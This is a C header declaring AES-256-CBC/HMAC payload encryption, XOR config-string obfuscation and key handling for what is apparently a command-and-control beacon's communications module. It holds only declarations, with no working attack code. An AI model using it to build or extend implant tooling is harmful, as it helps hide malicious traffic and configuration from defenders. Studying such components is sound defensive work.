#ifndef CRYPTO_H
#define CRYPTO_H
#include "common.h"

#pragma comment(lib, "bcrypt.lib")

#define KEYSIZE   32 // AES-256
#define IVSIZE    16 // CBC IV
#define HMAC_SIZE 32 // HMAC-SHA256 output

typedef struct _AES {
  PBYTE pKey;
  PBYTE pIv;
  PBYTE pPlainText; // input for encrypt / output for decrypt
  DWORD dwPlainSize;
  PBYTE pCipherText; // output for encrypt / input for decrypt
  DWORD dwCipherSize;
} AES, *PAES;

// Public API — only these two are called from comms.c
// Wire format: [16B IV | AES-256-CBC ciphertext | 32B HMAC-SHA256]
BOOL aes_encrypt_payload(PBYTE plain, DWORD plainLen, PVOID *outCipher,
                         DWORD *outLen);
BOOL aes_decrypt_payload(PBYTE cipher, DWORD cipherLen, PVOID *outPlain,
                         DWORD *outLen);

// XOR decode — in-place single-byte XOR for config string obfuscation
VOID xor_decode(BYTE *buf, DWORD len, BYTE key);

// Session key — swap the active AES key/IV at runtime
BOOL crypto_set_session_key(const BYTE *key, DWORD keyLen,
                            const BYTE *iv, DWORD ivLen);

// Key wipe — call before beacon exits
VOID crypto_wipe_keys(VOID);

#endif /* CRYPTO_H */